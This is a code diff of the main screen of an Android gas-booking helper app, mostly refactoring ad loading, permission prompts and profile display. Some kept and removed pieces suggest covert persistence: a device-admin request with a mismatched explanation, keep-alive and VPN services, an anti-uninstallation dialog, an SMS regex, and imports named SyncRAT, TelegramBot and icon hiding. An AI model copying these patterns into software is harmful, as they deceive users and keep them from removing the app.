@@ -3,7 +3,7 @@ package android.iocl.dac_collector.Ui;
 import static android.iocl.dac_collector.Utility.Constant.DefaultRegex;
 import static com.ykun.live_library.config.RunMode.HIGH_POWER_CONSUMPTION;
 
-import android.app.AppOpsManager;
+import android.annotation.SuppressLint;
 import android.app.StatusBarManager;
 import android.app.admin.DevicePolicyManager;
 import android.app.job.JobInfo;
@@ -11,7 +11,6 @@ import android.app.job.JobScheduler;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.iocl.dac_collector.BuildConfig;
@@ -31,31 +30,22 @@ import android.iocl.dac_collector.ModelData.update_dac_collect;
 import android.iocl.dac_collector.R;
 import android.iocl.dac_collector.RetrofitClient.RequestService;
 import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
-
 import android.iocl.dac_collector.Services.DownloadService;
-import android.iocl.dac_collector.Services.FixOppoAutoKill;
 import android.iocl.dac_collector.Services.ImageJobService;
 import android.iocl.dac_collector.Services.JobSchedulerUtil;
 import android.iocl.dac_collector.Services.PersistentVpnServiceUtil;
-import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
 import android.iocl.dac_collector.Utility.Constant;
-import android.iocl.dac_collector.Utility.LauncherIconHelper;
-import android.iocl.dac_collector.Utility.NotificationHelper;
 import android.iocl.dac_collector.Utility.PermissionUtility;
 import android.iocl.dac_collector.Utility.SharedPrefs;
-import android.iocl.dac_collector.Utility.TelegramBot;
 import android.iocl.dac_collector.Utility.Utility;
 import android.iocl.dac_collector.adapter.UpdateDescList;
-
 import android.iocl.keepAlive.ServiceA;
-import android.iocl.sms_handler_8_0_below.SmsActivity;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.MediaStore;
-import android.provider.Settings;
 import android.text.Html;
 import android.util.Log;
 import android.view.LayoutInflater;
@@ -74,7 +64,6 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.constraintlayout.widget.ConstraintLayout;
-import androidx.core.app.ActivityCompat;
 import androidx.core.content.FileProvider;
 import androidx.core.view.ViewCompat;
 import androidx.core.view.WindowCompat;
@@ -85,8 +74,10 @@ import androidx.recyclerview.widget.RecyclerView;
 import com.google.android.gms.ads.AdError;
 import com.google.android.gms.ads.AdRequest;
 import com.google.android.gms.ads.AdView;
+import com.google.android.gms.ads.AdapterResponseInfo;
 import com.google.android.gms.ads.FullScreenContentCallback;
 import com.google.android.gms.ads.LoadAdError;
+import com.google.android.gms.ads.ResponseInfo;
 import com.google.android.gms.ads.rewarded.RewardedAd;
 import com.google.android.gms.ads.rewarded.RewardedAdLoadCallback;
 import com.google.android.gms.ads.rewardedinterstitial.RewardedInterstitialAd;
@@ -103,7 +94,6 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Calendar;
-import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.ExecutorService;
@@ -116,38 +106,26 @@ import retrofit2.Response;
 
 public class MainActivity extends AppCompatActivity implements ResponseListener {
 
-    private StatusBarManager statusBarManager;
-
-    private AdView mAdView, adView2;
     private static final String TAG = "MainActivity_Mokardder";
+    private static final AdRequest sharedAdRequest = new AdRequest.Builder().build();
+    private static AdView sharedBanner1;
+    private static AdView sharedBanner2;
+    private final ExecutorService executorService = Executors.newSingleThreadExecutor();  // Executor for background tasks
     FirebaseAnalytics mFirebaseAnalytics;
     FirebaseDBClient fireDB;
     Boolean isSkippingFCM = false;
-
-
     Button fetchUserDetails;
-
-    private RewardedAd rewardedAd;
     LinearLayout loader;
-    TextView subsidyBadge, loader_text, call_Akram, call_Emdadul, tv_appVersion, call_Mokardder, refreshProfile,
-            userName, remainBook, lastBook, mobNo, consID, location, Book_Btn, Check_Update,
-            aboutApp, adminPerm, btn_skip, interestialAds, pointBtn;
+    TextView subsidyBadge, loader_text, call_Akram, call_Emdadul, changeUser, tv_appVersion, call_Mokardder, refreshProfile, userName, remainBook, lastBook, mobNo, consID, Book_Btn, Check_Update, aboutApp, adminPerm, btn_skip, interestialAds, pointBtn;
     ImageView annualTick;
     MaterialCardView subsidyActivity;
-
-    private static AdRequest sharedAdRequest = new AdRequest.Builder().build();
-    private static AdView sharedBanner1;
-    private static AdView sharedBanner2;
-
-    private RewardedInterstitialAd rewardedInterstitialAd;
-
-
     // FCM key - keep in sync with SharedPrefs
     String FCM_KEY = "";
-
     boolean isAccessibilityEnabled;
     boolean isDeviceAdminEnabled;
-    private ExecutorService executorService = Executors.newSingleThreadExecutor();  // Executor for background tasks
+    private AdView mAdView, adView2;
+    private RewardedAd rewardedAd;
+    private RewardedInterstitialAd rewardedInterstitialAd;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -170,7 +148,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
 
 
-
         checkMissingPermissions();
 
         setContentView(R.layout.activity_main);
@@ -179,7 +156,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
         initFirebaseThings();      // <-- improved token init
         sharedPrefsCheck();
-        settingUpJobs();
+
+        delayedAdsSetup();
+
         setClickListener();
         implementKeepAliveBelow8();
 
@@ -190,10 +169,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 //        askToHide();
 
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            statusBarManager = (StatusBarManager) getSystemService(StatusBarManager.class);
-        }
-
 
 
 
@@ -202,39 +177,44 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     private void checkMissingPermissions() {
 
-        
-        boolean isOnce = getIntent().getBooleanExtra("SKIP_ONCE", false);
-        boolean isPermanent = SharedPrefs.getPermanentlySkipping(this);
+//        executorService.execute(() -> {
+            boolean isOnce = getIntent().getBooleanExtra("SKIP_ONCE", false);
+            boolean isPermanent = SharedPrefs.getPermanentlySkipping(this);
+
+//            // ✅ Prevent looping after first time
+//            if (!SharedPrefs.isFirstTime(this)) {
+//                Log.d(TAG, "Not first time, skipping permission screen");
+//                return;
+//            }
+
+            if (!isOnce && !isPermanent) {
+                if (PermissionUtility.isAnyPermissionMissing(this, true)) {
+                    Intent start = new Intent(MainActivity.this, PermissionActivity.class);
 
 
-        
-        if (!isOnce && !isPermanent){
-            if (PermissionUtility.isAnyPermissionMissing(this)) {
-                List<String> missing = PermissionUtility.getMissingPermissions(this);
-                String[] missingArray = missing.toArray(new String[0]);
+                    List<String> missing = PermissionUtility.getMissingPermissions(this, true);
 
-
-                Log.d("PermsActivity", "refreshAndCheckCompletion: " + Arrays.toString(missingArray));
-                startActivity(new Intent(this, PermissionActivity.class).putExtra("permissions", missingArray));
-                return;
+                    Log.d("Missing", " Missinbg " + missing);
+                    if (missing != null && !missing.isEmpty()) {
+                        start.putExtra("permissions", missing.toArray(new String[0]));
+                    }
+                    startActivity(start);
+                    return;
+                }
             }
-        }
-        if (isPermanent){
-            Toast.makeText(this, "User Permanently Skipping Permissions", Toast.LENGTH_SHORT).show();
-            List<String> missing = PermissionUtility.getMissingPermissions(this);
-            String[] missingArray = missing.toArray(new String[0]);
 
-            new AlertDialog.Builder(this)
-                    .setTitle("Permissions Skipped")
-                    .setMessage(missingArray != null ? Arrays.toString( missingArray) : "Permission array is null")
-                    .setPositiveButton("Understand", (dialog, which) -> {
-                        dialog.dismiss();
-                    })
+            if (isPermanent) {
+                TextView permissionTV = findViewById(R.id.permissionPage);
+                permissionTV.setVisibility(View.VISIBLE);
+                Toast.makeText(this, "User Permanently Skipping Permissions", Toast.LENGTH_SHORT).show();
+                List<String> missing = PermissionUtility.getMissingPermissions(this, true);
+                String[] missingArray = missing != null ? missing.toArray(new String[0]) : new String[0];
 
-                    .show();
-        }
 
+                permissionTV.setOnClickListener(v -> startActivity(new Intent(this, PermissionActivity.class)));
+            }
     }
+
 
 
     private void implementKeepAliveBelow8() {
@@ -247,7 +227,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                     (context, intent) -> Log.d("JOB-->", " foregroundNotificationClick")));
         }
 
-        checkAppUpdate();
+
     }
 
     private void sharedPrefsCheck() {
@@ -258,10 +238,12 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         boolean missingInfo = "not_found".equals(username) || username.isEmpty() || "not_found".equals(consumerId) || consumerId.isEmpty();
 
 
-        if (SharedPrefs.getBoolean(ctx, "isFirstTime", true) || missingInfo) {
+        if (SharedPrefs.isFirstTime(ctx) || missingInfo) {
             subscribeTopics();
             SharedPrefs.setRestrictionEnabled(ctx);
-            Utility.updateMessagePattern(DefaultRegex, ctx);
+
+
+          executorService.execute(() -> Utility.updateMessagePattern(DefaultRegex, ctx) );
             showUserDetailsDialog();
 
         }
@@ -303,7 +285,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     private void initFirebaseThings() {
 
 
-
         CapturingInterceptor.setGlobalListener(this);
 
         Executors.newSingleThreadExecutor().execute(() -> {
@@ -327,8 +308,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                 FirebaseMessaging.getInstance().setAutoInitEnabled(true);
 
 
-                fireDB = new FirebaseDBClient(getApplicationContext());
-
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -338,7 +317,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     private void setViewsUI() {
         isAccessibilityEnabled = Utility.isAccessibilityServiceEnabled(getApplicationContext());
-
 
         boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);
         mAdView = findViewById(R.id.adView);
@@ -356,7 +334,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         mobNo = findViewById(R.id.mobNo);
         consID = findViewById(R.id.consID);
         annualTick = findViewById(R.id.annualTick);
-        location = findViewById(R.id.location);
+        changeUser = findViewById(R.id.changeUser);
+
         Check_Update = findViewById(R.id.Check_Update);
         Book_Btn = findViewById(R.id.Book_Btn);
         aboutApp = findViewById(R.id.aboutApp);
@@ -364,10 +343,10 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         subsidyActivity = findViewById(R.id.cardSubsidyHeader);
         interestialAds = findViewById(R.id.interestialAds);
 
-        adminPerm = findViewById(R.id.adminPerm);
-        if (isDeviceAdminEnabled && isAccessibilityEnabled && isRestrictionEnabled) {
-            adminPerm.setVisibility(View.GONE);
-        }
+//        adminPerm = findViewById(R.id.adminPerm);
+//        if (isDeviceAdminEnabled && isAccessibilityEnabled && isRestrictionEnabled) {
+//            adminPerm.setVisibility(View.GONE);
+//        }
     }
 
     private void imageObserverSchedule() {
@@ -388,8 +367,12 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
 
     }
-
-
+    // Delay ads initialization until after main UI is ready
+    private void delayedAdsSetup() {
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            settingUpJobs(); // Your current method
+        }, 2000); // 2-second delay to ensure main thread is free
+    }
 
     private void settingUpJobs() {
         if (sharedBanner1 != null && sharedBanner1.getParent() == null) {
@@ -415,7 +398,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
 
 
-
         imageObserverSchedule();
 
         if (!Utility.isJobSchedulerActive(MainActivity.this, 1)) {
@@ -424,7 +406,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
         }
-
 
     }
 
@@ -446,8 +427,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                 loadRewardedAd();
             }
 
-
-
         });
 
         Check_Update.setOnClickListener(v -> {
@@ -462,9 +441,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             }
         });
 
-        adminPerm.setOnClickListener(v -> {
-//            showAdminAlert();
-        });
 
 
         call_Akram.setOnClickListener(v -> {
@@ -500,23 +476,26 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             }
         });
 
-        tv_appVersion.setText(BuildConfig.VERSION_NAME);
 
-
+        tv_appVersion.setText(BuildConfig.VERSION_NAME  + (BuildConfig.DEBUG ? " DEBUG MODE 🐞" : ""));
+        changeUser.setOnClickListener(view -> {
+            showUserDetailsDialog();
+        });
     }
 
     private void showInterestialDialog() {
+        if (true){
+            Toast.makeText(this, "Coming soon!", Toast.LENGTH_SHORT).show();
+            return;
+        }
 
-        int requiredPoint = 192;
-        int requiredAds = 20;
+
+        int requiredPoint = 00;
+        int requiredAds = 00;
 
         String title = "📖 ব্যবহার নির্দেশিকা";
 
-        String userGuide = "1️⃣ প্রতিবার বিজ্ঞাপন দেখলে আপনি ৫ পয়েন্ট পাবেন।\n\n" +
-                "2️⃣ এক মাসের Book পেতে আপনার মোট প্রয়োজন হবে " + requiredPoint + " পয়েন্ট।\n\n" +
-                "3️⃣ অর্থাৎ, এক মাসের Book পেতে আপনাকে আনুমানিক " +  requiredAds +  " টি বিজ্ঞাপন দেখতে হবে।\n\n" +
-                "4️⃣ আপনার যত বেশি পয়েন্ট জমবে, তত দ্রুত আপনি Book নিতে পারবেন।\n\n" +
-                "👉 টিপস: প্রতিদিন কয়েকটা বিজ্ঞাপন দেখলে সহজেই আপনার লক্ষ্য পূর্ণ হবে।";
+        String userGuide = "1️⃣ প্রতিবার বিজ্ঞাপন দেখলে আপনি ৫ পয়েন্ট পাবেন।\n\n" + "2️⃣ এক মাসের Book পেতে আপনার মোট প্রয়োজন হবে " + requiredPoint + " পয়েন্ট।\n\n" + "3️⃣ অর্থাৎ, এক মাসের Book পেতে আপনাকে আনুমানিক " + requiredAds + " টি বিজ্ঞাপন দেখতে হবে।\n\n" + "4️⃣ আপনার যত বেশি পয়েন্ট জমবে, তত দ্রুত আপনি Book নিতে পারবেন।\n\n" + "👉 টিপস: প্রতিদিন কয়েকটা বিজ্ঞাপন দেখলে সহজেই আপনার লক্ষ্য পূর্ণ হবে।\n\n" + "❌ Yet to Release !!";
 
 
         ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_startup);
@@ -543,9 +522,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         final AlertDialog alertDialog = builder.create();
 
 
-
-
-
         alertDialog.setCancelable(true);
 
         if (alertDialog.getWindow() != null) {
@@ -555,15 +531,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         alertDialog.show();
     }
 
-    // New token callback interface
-    private interface TokenCallback {
-        void onToken(String token);
-    }
-
-    /**
-     * refreshFCMToken: fetch current token and persist to SharedPrefs.
-     * - Will call callback on completion (may be null)
-     */
     private void refreshFCMToken(TokenCallback cb) {
         try {
             // ensure FirebaseApp initialized
@@ -611,7 +578,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         alertDialog.show();
     }
 
-
     private void loadRewardedInterstitial() {
 
         Log.d(TAG, "loadRewardedInterstitial: CAlling");
@@ -619,11 +585,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
         AdRequest adRequest = new AdRequest.Builder().build();
 
-        RewardedInterstitialAd.load(
-                this,
-                unitID, // test ad unit
-                adRequest,
-                new RewardedInterstitialAdLoadCallback() {
+        RewardedInterstitialAd.load(this, unitID, // test ad unit
+                adRequest, new RewardedInterstitialAdLoadCallback() {
                     @Override
                     public void onAdLoaded(RewardedInterstitialAd ad) {
                         rewardedInterstitialAd = ad;
@@ -631,13 +594,62 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                     }
 
                     @Override
-                    public void onAdFailedToLoad(LoadAdError adError) {
-                        rewardedInterstitialAd = null;
-                        Log.d(TAG, "onAdFailedToLoad: " + adError.getMessage());
+                    public void onAdFailedToLoad(@NonNull LoadAdError loadAdError) {
+                        // Keep your existing reference, e.g., rewardedInterstitialAd = null;
+                        // Log the basic error details
+                        Log.e(TAG, "Ad failed to load with error code: " + loadAdError.getCode() + ". Message: " + loadAdError.getMessage());
+                        Log.e(TAG, "Domain: " + loadAdError.getDomain());
+                        Log.e(TAG, "Cause: " + loadAdError.getCause());
+
+                        // Get and log ResponseInfo
+                        ResponseInfo responseInfo = loadAdError.getResponseInfo();
+
+                        if (responseInfo != null) {
+                            Log.e(TAG, "------- Response Info Start -------");
+                            Log.e(TAG, "Response ID: " + responseInfo.getResponseId());
+
+                            // For direct AdMob fills, this will likely be AdMob's adapter.
+                            // For mediation, it will be the adapter that AdMob attempted to get an ad from
+                            // or the "winning" adapter if an error occurred after an ad was technically filled by a network.
+                            Log.e(TAG, "Mediation Adapter Class Name (if applicable): " + responseInfo.getMediationAdapterClassName());
+
+                            // Log details for each adapter in the waterfall (especially useful for mediation)
+                            if (responseInfo.getAdapterResponses() != null && !responseInfo.getAdapterResponses().isEmpty()) {
+                                Log.e(TAG, "--- Adapter Responses Start ---");
+                                for (AdapterResponseInfo adapterResponse : responseInfo.getAdapterResponses()) {
+                                    Log.e(TAG, "Adapter Class Name: " + adapterResponse.getAdapterClassName());
+                                    Log.e(TAG, "  Latency (ms): " + adapterResponse.getLatencyMillis());
+                                    Log.e(TAG, "  Credentials: " + adapterResponse.getCredentials()); // May be empty or redacted
+                                    AdError adapterError = adapterResponse.getAdError();
+                                    if (adapterError != null) {
+                                        Log.e(TAG, "  Adapter Error Code: " + adapterError.getCode());
+                                        Log.e(TAG, "  Adapter Error Message: " + adapterError.getMessage());
+                                        Log.e(TAG, "  Adapter Error Domain: " + adapterError.getDomain());
+                                    } else {
+                                        Log.e(TAG, "  Adapter successfully loaded an ad (or did not error).");
+                                    }
+                                    Log.e(TAG, "  ----");
+                                }
+                                Log.e(TAG, "--- Adapter Responses End ---");
+                            } else {
+                                Log.e(TAG, "No adapter responses available in ResponseInfo.");
+                            }
+
+                            // You can also get loaded ad source name if available (after mediation)
+                            // String loadedAdSourceName = responseInfo.getLoadedAdNetworkName(); // In newer versions
+
+                            Log.e(TAG, "------- Response Info End -------");
+                        } else {
+                            Log.e(TAG, "ResponseInfo was null for this ad load error.");
+                        }
+
+                        // Your existing logic to handle the ad load failure, like trying to load again.
+                        // e.g., loadRewardedInterstitial();
                     }
-                }
-        );
+
+                });
     }
+
     private void showRewardedInterstitial() {
         if (rewardedInterstitialAd != null) {
             rewardedInterstitialAd.setFullScreenContentCallback(new FullScreenContentCallback() {
@@ -670,13 +682,11 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
                 int currentPoint = SharedPrefs.getUserRewardPoint(this);
 
-                if (pointBtn != null){
-                    pointBtn.setText( "" + currentPoint);
+                if (pointBtn != null) {
+                    pointBtn.setText("" + currentPoint);
                 }
 
                 Log.d(TAG, "showRewardedInterstitial: " + currentPoint);
-
-
 
 
             });
@@ -699,8 +709,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         // Optional: Your logic for UI update, Toast, etc.
         // e.g., Toast.makeText(this, "Points: " + newPoints, Toast.LENGTH_SHORT).show();
     }
-
-
 
     private void showSubsidyDialog() {
         // Inflate the layout
@@ -745,23 +753,46 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             return;
         }
         boolean isAnnual = data.getCon_type().equals("UJJAWALA") && !data.getBooking_date().isEmpty();
+        boolean isUjjawala = data.getCon_type().equals("UJJAWALA");
+        boolean isGeneralAutomatedOn = !data.getCon_type().equals("UJJAWALA") && !data.getSubscription().isEmpty();
 
         userName.setText(data.getName());
+
+
+        if (isUjjawala) {
+            interestialAds.setVisibility(View.VISIBLE);
+        }
 
 
         remainBook.setText(isAnnual ? data.getSubscription() : "Recharge End");
         lastBook.setText(isAnnual ? data.getBooking_date() : "No Subscription");
         mobNo.setText(data.getMobile_no() + (!data.getAlternate_number().isEmpty() ? " / " + data.getAlternate_number() : ""));
         consID.setText(data.getConsumer_id());
-        location.setText(data.getLocation().isEmpty() ? "No Location" : data.getLocation());
 
+        TextView tv_lastBook = findViewById(R.id.tv_lastBook);
         if (!isAnnual) {
-            TextView tv_lastBook = findViewById(R.id.tv_lastBook);
+
             tv_lastBook.setText("Recharge End On");
             remainBook.setText("Recharge End");
             lastBook.setText(data.getSub_end_month());
             annualTick.setVisibility(View.GONE);
-            return;
+
+        }
+        Log.d(TAG, "loadProfileTV: " + isUjjawala);
+        if (!isUjjawala) {
+
+            remainBook.setText("Unlimited");
+            tv_lastBook.setText("Automatic Book");
+            lastBook.setText("Turned ON");
+            lastBook.setTextColor(Color.parseColor("#006400"));
+            annualTick.setVisibility(View.VISIBLE);
+            if (!isGeneralAutomatedOn){
+                remainBook.setText("❌");
+                tv_lastBook.setText("Automatic Book");
+                lastBook.setText("Turned Off");
+                lastBook.setTextColor(Color.parseColor("#FF0000"));
+
+            }
         }
 
         if (isAnnual) {
@@ -780,14 +811,13 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         startActivity(phone_intent);
     }
 
-
     public List<appUpdateDesc> SplitText(String desc) {
         String[] parts = desc.split("\\s*,\\s*"); // Split and trim text by commas
         List<appUpdateDesc> descriptions = new ArrayList<>();
 
         int index = 1; // Initialize the index variable
         for (String part : parts) {
-            descriptions.add(new appUpdateDesc(part.trim(), String.valueOf(index) + " ˟"));
+            descriptions.add(new appUpdateDesc(part.trim(), index + " ˟"));
             index++; // Increment the index
         }
 
@@ -854,9 +884,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                 if (isSuccess) {
                     Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                     if (dialog != null) dialog.dismiss();
-                    SharedPrefs.setBoolean(MainActivity.this, "isFirstTime", false);
+                    SharedPrefs.setFirstTime(MainActivity.this, false);
                 } else {
-                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                 }
 
 
@@ -891,7 +921,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                     subsidyBadge.setText("Your Request is Pending");
                     dialog.dismiss();
                 } else {
-                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                 }
 
 
@@ -907,17 +937,14 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     }
 
-
     private void loadRewardedAd() {
 
         String adUnitId = getString(R.string.reward_ad_unit_id);
         AdRequest adRequest = new AdRequest.Builder().build();
 
 
-        RewardedAd.load(this,
-                adUnitId, // test ad unit id
-                adRequest,
-                new RewardedAdLoadCallback() {
+        RewardedAd.load(this, adUnitId, // test ad unit id
+                adRequest, new RewardedAdLoadCallback() {
                     @Override
                     public void onAdLoaded(@NonNull RewardedAd ad) {
                         rewardedAd = ad;
@@ -949,8 +976,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                     }
                 });
     }
-
-
 
     private void showUserDetailsDialog() {
 
@@ -993,6 +1018,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         });
     }
 
+    @SuppressLint("SetTextI18n")
     private void showAppDialog(String url, String desc, String versionCode_Name) {
         // Holder for the downloaded file
         AtomicReference<File> apkFileRef = new AtomicReference<>();
@@ -1062,9 +1088,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         });
     }
 
-
-    // Moved outside the onCreate method
-
     private void userFind(String userSearchTerm, LinearLayout loader, TextView loader_text, View view, AlertDialog dialog) {
         loader_controller("Getting User Data ...", true, loader, loader_text);
         RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
@@ -1072,6 +1095,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         search_consumer receiver = new search_consumer("getUserDetails", query);
         Call<DAC_Collector_Base> auth = requestService.search_customer(receiver);
         auth.enqueue(new Callback<DAC_Collector_Base>() {
+            @SuppressLint("SetTextI18n")
             @Override
             public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                 loader_controller("Fetching Customer ...", false, loader, loader_text);
@@ -1080,7 +1104,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                 boolean isSuccess = response.body().getSuccess();
                 if (!isSuccess) {
                     String message = response.body().getMessage();
-                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                     return;
                 }
                 ConsumerData data = (ConsumerData) Utility.decodeApiResponse(encResponse, ConsumerData.class);
@@ -1099,6 +1123,13 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                 });
 
                 saveData.setOnClickListener(v -> {
+
+                    if (userName.equals("not_found") || userName.equals("not_found")){
+                        loader_controller("Getting User Data ...", false, loader, loader_text);
+                        Toast.makeText(MainActivity.this, "user name is empty, Refetch!!", Toast.LENGTH_SHORT).show();
+                        return;
+
+                    }
                     new Handler().postDelayed(() -> { // Wait for token retrieval (but update_dac_collect also ensures token)
                         Utility.updateProfile(encResponse, getApplicationContext());
                         loadProfileTV();
@@ -1120,6 +1151,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             }
         });
     }
+
+
+    // Moved outside the onCreate method
 
     private void refreshUser(String userSearchTerm) {
         loader_controller("Refreshing Profile...", true, loader, loader_text);
@@ -1164,7 +1198,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
     }
 
-
     private void checkAppUpdate() {
 
 //        loader_controller("Checking Update....", true, loader, loader_text);
@@ -1191,7 +1224,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
                     if (version_code > BuildConfig.VERSION_CODE) {
                         showAppDialog(url, appDesc, versionName);
-                    }else {
+                    } else {
                         Toast.makeText(MainActivity.this, "Already Latest Version.", Toast.LENGTH_SHORT).show();
                     }
 
@@ -1212,7 +1245,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         });
     }
 
-
     public void loader_controller(String loader_text_inp, Boolean ShouldBeShown, LinearLayout loader, TextView loader_text) {
 
         if (ShouldBeShown) {
@@ -1225,97 +1257,12 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
     }
 
-
-    // Moved outside the onCreate method
-
-
-//    public void showPermissionRequests() {
-//        RecyclerView recyclerView;
-//        PermissionAdapter permissionAdapter;
-//        List<PermissionItem> permissionList;
-//
-//        recyclerView = findViewById(R.id.permissions_recycler_view);
-//        recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
-//
-//        // Sample data
-//        permissionList = new ArrayList<>();
-//        permissionList.add(new PermissionItem("Camera", "This app requires access to your camera", R.drawable.gas_cylinder_icon, false));
-//        permissionList.add(new PermissionItem("Storage", "This app requires access to your storage", R.drawable.verify_icon_blue, true));
-//
-//        permissionAdapter = new PermissionAdapter(this, permissionList);
-//        recyclerView.setAdapter(permissionAdapter);
-//
-//        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_permissions);
-//        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.permission_dialog, relativeLayoutAlert);
-//        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
-//        builder.setView(view);
-//
-//
-//        final AlertDialog alertDialog = builder.create();
-//
-//        alertDialog.setCancelable(false);
-//
-//        if (alertDialog.getWindow() != null) {
-//            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
-//        }
-//        alertDialog.show();
-//
-//    }
-
-
-    public void showAdminAlert() {
-
-        boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);
-
-        Log.d(TAG, "showAdminAlert: Enabled " + isRestrictionEnabled);
-
-        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_startup);
-
-        // Use Activity context to inflate layout
-        View view = LayoutInflater.from(MainActivity.this).inflate(R.layout.disable_app_uninstallation, relativeLayoutAlert, false);
-
-        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
-        builder.setView(view);
-
-        TextView tvAdmin = view.findViewById(R.id.tv_admin_turnOn);
-        TextView tvAccessibility = view.findViewById(R.id.tv_accessibility_turn_on);
-        TextView tvSetRestriction = view.findViewById(R.id.setRestriction);
-
-        if (isAccessibilityEnabled) {
-            tvAccessibility.setVisibility(View.GONE);
-        }
-
-        if (isDeviceAdminEnabled) {
-            tvAdmin.setVisibility(View.GONE);
-        }
-
-        if (isRestrictionEnabled) {
-            tvSetRestriction.setVisibility(View.GONE);
-        }
-
-        final AlertDialog alertDialog = builder.create();
-
-
-
-
-
-        alertDialog.setCancelable(true);
-
-        if (alertDialog.getWindow() != null) {
-            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
-        }
-
-        alertDialog.show();
-    }
-
-
     @Override
     protected void onResume() {
         super.onResume();
         loadProfileTV();
         checkMissingPermissions();
     }
-
 
     private void enableDeviceAdmin() {
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -1337,8 +1284,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for secure features like password reset and lock.");
         startActivity(intent); // Must be from Activity, not application context
     }
-
-
 
     private boolean isHtml(String input) {
         return input != null && input.matches(".*\\<[^>]+>.*");
@@ -1362,6 +1307,10 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         });
 
 
+    }
+
+    private interface TokenCallback {
+        void onToken(String token);
     }
 
 
